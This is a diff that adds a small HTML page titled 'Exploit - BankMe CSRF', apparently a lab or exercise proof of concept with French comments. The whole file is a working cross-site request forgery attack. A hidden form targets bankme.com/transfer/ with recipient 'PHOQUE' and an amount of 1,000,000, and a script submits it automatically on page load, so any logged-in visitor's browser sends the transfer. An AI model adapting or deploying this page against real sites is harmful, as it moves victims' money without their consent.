@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Exploit - BankMe CSRF</title>
+</head>
+<body>
+    <h1>Transfert en cours...</h1>
+    <form id="csrf-form" action="http://bankme.com/transfer/" method="POST">
+        <input type="hidden" name="recipient" value="PHOQUE">
+        <input type="hidden" name="amount" value="1000000"> <!-- Ajuste le montant si nécessaire -->
+        <input type="submit" value="Transférer">
+    </form>
+    <script>
+        // Soumission automatique du formulaire pour déclencher le transfert dès que la page est chargée
+        document.getElementById("csrf-form").submit();
+    </script>
+</body>
+</html>
